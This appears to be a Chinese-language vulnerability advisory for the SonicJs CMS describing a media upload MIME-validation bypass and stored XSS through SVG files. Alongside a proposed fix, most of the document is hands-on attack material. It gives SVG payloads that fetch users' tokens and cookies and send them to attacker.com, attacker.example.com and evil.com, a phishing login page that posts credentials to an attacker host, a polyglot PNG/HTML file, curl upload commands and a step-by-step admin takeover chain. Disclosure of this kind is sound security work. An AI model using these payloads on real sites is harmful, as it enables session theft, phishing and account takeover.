# SONIC-2025-004: Media Upload MIME 验证绕过 + SVG 存储型 XSS

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [SonicJs-Org/sonicjs](https://github.com/SonicJs-Org/sonicjs) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | Medium |
| **CVSS 3.1** | 6.1 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) |
| **CWE** | CWE-79 (Stored XSS), CWE-345 (Insufficient Verification of Data Authenticity) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/需认证/需用户交互 |


## 漏洞概述

SonicJs 的 Media Upload API 对文件类型的验证仅依赖客户端声明的 MIME type（`file.type`），
没有通过 magic bytes 做二次验证。同时 `image/svg+xml` 在允许列表中，
但上传时没有对 SVG 内容做任何安全清理（无 DOMPurify/sanitize）。

攻击者可以：
1. 上传包含 JavaScript 的恶意 SVG 文件（存储型 XSS）
2. 伪造 Content-Type 上传任意文件（如声明 `image/png` 但实际是 HTML）

## 漏洞代码

**文件**: `packages/core/src/routes/api-media.ts` (第18-30行)

```typescript
const fileValidationSchema = z.object({
  name: z.string().min(1).max(255),
  type: z.string().refine(
    (type) => {
      const allowedTypes = [
        'image/jpeg', 'image/jpg', 'image/png', 'image/gif',
        'image/webp', 'image/svg+xml',  // ← SVG 允许，但无 sanitize
        'application/pdf', 'text/plain', ...
      ]
      return allowedTypes.includes(type)
      // ← 仅检查 file.type 属性（客户端声明），无 magic bytes 验证
    },
    { message: 'Unsupported file type' }
  ),
  size: z.number().min(1).max(50 * 1024 * 1024)
})
```

**关键缺失**:
- 无 `file-type` 库对文件头进行二次检测
- 无 SVG sanitize（对比 Ghost 使用 DOMPurify，Payload 使用 validateSvg）
- 上传后直接存入 R2 并生成 public URL，浏览器访问时直接渲染


## PoC (概念验证)

### 攻击1: SVG 存储型 XSS

创建恶意 SVG 文件 `evil.svg`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script>
    fetch('/auth/me', {credentials:'include'})
      .then(r=>r.json())
      .then(d=>fetch('https://attacker.com/steal?token='+d.token))
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
```

```bash
TOKEN="eyJ..."

curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@evil.svg;type=image/svg+xml"

# 返回 publicUrl: https://pub-xxx.r2.dev/uploads/abc123.svg
# 任何访问此 URL 的用户都会执行 XSS payload
```

### 攻击2: MIME 类型伪造

```bash
# 将 HTML 文件伪装为 PNG 上传
curl -X POST https://target.workers.dev/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@phishing.html;type=image/png;filename=image.png"

# file.type 来自 Content-Type，服务端不做 magic bytes 校验
# R2 存储时使用 contentType: file.type，所以可能以错误类型服务
```

## 影响

- 存储型 XSS：窃取其他用户（包括 admin）的 session token
- 钓鱼：上传伪装的 HTML 页面
- 内容投毒：替换合法图片为恶意内容

## 修复建议

```typescript
import { fileTypeFromBuffer } from 'file-type'
import createDOMPurify from 'dompurify'
import { JSDOM } from 'jsdom'

// 1. 添加 magic bytes 验证
const arrayBuffer = await file.arrayBuffer()
const detected = await fileTypeFromBuffer(arrayBuffer)
if (detected && detected.mime !== file.type) {
  return c.json({ error: `MIME type mismatch: declared ${file.type}, detected ${detected.mime}` }, 400)
}

// 2. SVG sanitize
if (file.type === 'image/svg+xml') {
  const window = new JSDOM('').window
  const DOMPurify = createDOMPurify(window)
  const content = new TextDecoder().decode(arrayBuffer)
  const sanitized = DOMPurify.sanitize(content, { USE_PROFILES: { svg: true } })
  if (!sanitized || sanitized.trim() === '') {
    return c.json({ error: 'SVG contains potentially harmful content' }, 400)
  }
  // 用 sanitized 内容替换原始文件
  arrayBuffer = new TextEncoder().encode(sanitized).buffer
}

// 3. 设置安全响应头
await c.env.MEDIA_BUCKET.put(r2Key, arrayBuffer, {
  httpMetadata: {
    contentType: file.type,
    contentDisposition: 'attachment',  // 强制下载而非内联渲染
    // 或者对 SVG 设置 CSP
  }
})
```

## 本地复现步骤（手把手）

> 前置条件：参考 [sonicjs-local-setup.md](sonicjs-local-setup.md) 完成环境搭建并启动 `wrangler dev`。

### 1. 获取认证 Token

```bash
# 创建/登录一个用户（任何角色都行，viewer 也可以上传媒体）
curl -s -X POST http://localhost:8787/auth/seed-admin
RESPONSE=$(curl -s -X POST http://localhost:8787/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sonicjs.com","password":"sonicjs!"}')

TOKEN=$(echo $RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"
```

### 2. 攻击A：上传恶意 SVG（存储型 XSS）

```bash
# 创建包含 JavaScript 的恶意 SVG
cat > /tmp/xss.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
  <script type="text/javascript">
    // 窃取当前用户的 auth cookie 和 token
    var stolen = document.cookie;
    fetch('/auth/me', {credentials:'include'})
      .then(function(r){return r.json()})
      .then(function(data){
        // 发送到攻击者服务器
        new Image().src = 'https://attacker.example.com/steal?cookie='
          + encodeURIComponent(stolen)
          + '&data=' + encodeURIComponent(JSON.stringify(data));
      });
  </script>
  <rect width="200" height="200" fill="#ff6600"/>
  <text x="50" y="110" font-size="20" fill="white">Loading...</text>
</svg>
EOF

# 上传恶意 SVG
curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xss.svg;type=image/svg+xml" | python3 -m json.tool
```

**预期输出**：
```json
{
  "success": true,
  "file": {
    "id": "abc123...",
    "filename": "abc123.svg",
    "originalName": "xss.svg",
    "mimeType": "image/svg+xml",
    "publicUrl": "https://pub-sonicjs-media-dev.r2.dev/uploads/abc123.svg"
  }
}
```

### 3. 验证 XSS 生效

```bash
# 获取上传后的 public URL
PUBLIC_URL=$(curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xss.svg;type=image/svg+xml" | python3 -c "import sys,json; print(json.load(sys.stdin)['file']['publicUrl'])")

echo "恶意 SVG URL: $PUBLIC_URL"

# 在本地模式下，文件存储在 .wrangler/state/v3/r2/ 目录
# 验证文件内容（应包含完整的 <script> 标签，未被清理）
find .wrangler/state/v3/r2/ -name "*.svg" -exec cat {} \;
```

**验证方法**：
1. 在浏览器中直接打开上传后的 SVG 文件 URL
2. 如果是本地环境，直接打开 `.wrangler/state/v3/r2/sonicjs-ci-media/uploads/xxx.svg`
3. 观察 JavaScript 是否执行（浏览器控制台/网络请求）

```bash
# 用 python 启动一个本地 HTTP 服务器来测试 SVG 渲染
cd .wrangler/state/v3/r2/sonicjs-ci-media/
python3 -m http.server 9999 &
echo "打开浏览器访问: http://localhost:9999/uploads/"
echo "点击上传的 .svg 文件，观察浏览器开发者工具中的网络请求"
```

### 4. 攻击B：MIME 类型伪造（上传 HTML 冒充 PNG）

```bash
# 创建恶意 HTML 文件
cat > /tmp/phishing.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Login Required</title></head>
<body style="font-family:Arial; text-align:center; padding:50px;">
  <h1>Session Expired</h1>
  <p>Please re-enter your credentials:</p>
  <form action="https://attacker.example.com/phish" method="POST">
    <input type="email" name="email" placeholder="Email" style="padding:10px; margin:5px; width:300px;"><br>
    <input type="password" name="password" placeholder="Password" style="padding:10px; margin:5px; width:300px;"><br>
    <button type="submit" style="padding:10px 30px; background:#0066ff; color:white; border:none; cursor:pointer;">Login</button>
  </form>
</body>
</html>
EOF

# 伪装为 image/png 类型上传
# curl 的 -F 参数中 type= 控制 Content-Type，服务端直接信任
curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/phishing.html;type=image/png;filename=screenshot.png" | python3 -m json.tool
```

**预期结果**：上传成功，因为服务端只检查 `file.type`（来自 multipart Content-Type header），不检查实际文件内容。

### 5. 验证 MIME 伪造效果

```bash
# 查看上传后的文件实际内容
find .wrangler/state/v3/r2/ -name "*.png" -newer /tmp/phishing.html -exec file {} \; 2>/dev/null
# 输出会显示: ASCII text (HTML document) 而不是 PNG image

# 查看数据库记录
npx wrangler d1 execute DB --local \
  --command="SELECT filename, original_name, mime_type FROM media ORDER BY uploaded_at DESC LIMIT 3;"
```

**预期数据库输出**：
```
filename       | original_name   | mime_type
abc123.png     | screenshot.png  | image/png    ← 声称是 PNG，实际是 HTML
def456.svg     | xss.svg         | image/svg+xml
```

### 6. 攻击C：上传带事件处理器的 SVG（绕过基础过滤）

```bash
# 有些检测可能只看 <script> 标签
# 用 SVG 事件处理器绕过
cat > /tmp/event-xss.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="blue"
        onload="fetch('/auth/me',{credentials:'include'}).then(r=>r.text()).then(d=>new Image().src='https://evil.com/?d='+btoa(d))"/>
</svg>
EOF

curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/event-xss.svg;type=image/svg+xml" | python3 -m json.tool
# 同样会成功上传，因为没有 SVG sanitize
```

### 7. 对比：验证没有 magic bytes 检查

```bash
# 创建一个真正的 PNG 文件头 + HTML 内容（多态文件）
printf '\x89PNG\r\n\x1a\n' > /tmp/polyglot.png
cat /tmp/phishing.html >> /tmp/polyglot.png

# 上传 - 即使有 magic bytes 检查也只看前几字节
curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/polyglot.png;type=image/png" | python3 -m json.tool

# 但实际上 SonicJs 连 magic bytes 都不检查
# 完全信任客户端声明的 type 值
```

### 8. 完整攻击链演示

```bash
echo "=== SVG XSS 攻击链 ==="
echo ""
echo "1. 攻击者注册一个 viewer 账户"
echo "2. 上传恶意 SVG 到媒体库"
echo "3. 将 SVG 的 public URL 发送给 admin（如嵌入评论、邮件）"
echo "4. Admin 点击/预览 SVG"
echo "5. JavaScript 执行，cookie/token 被窃取"
echo "6. 攻击者用窃取的 admin token 接管系统"
echo ""

# 模拟完整链
# Step 1-2: 已在上面完成

# Step 3: 获取 public URL
SVG_URL=$(curl -s -X POST http://localhost:8787/api/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xss.svg;type=image/svg+xml" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['file']['publicUrl'])")

echo "分享此链接给受害者: $SVG_URL"
echo ""
echo "当受害者在浏览器中打开此 URL 时，嵌入的 JS 会自动执行"
echo "窃取其 auth cookie 和用户信息"
```

### 关键观察点

| 检查项 | SonicJs 当前状态 | 安全做法 (如 Ghost) |
|--------|-----------------|---------------------|
| MIME 白名单 | ✅ 有（但仅检查客户端声明） | ✅ 有 |
| Magic bytes 验证 | ❌ 无 | ✅ 使用 file-type 库 |
| SVG 内容清理 | ❌ 无 | ✅ DOMPurify sanitize |
| Content-Disposition | ❌ 无（inline 渲染） | ✅ attachment（强制下载） |
| CSP 头 | ❌ 无 | ✅ 对用户内容限制脚本 |

## 参考

- [CWE-79: Stored XSS](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
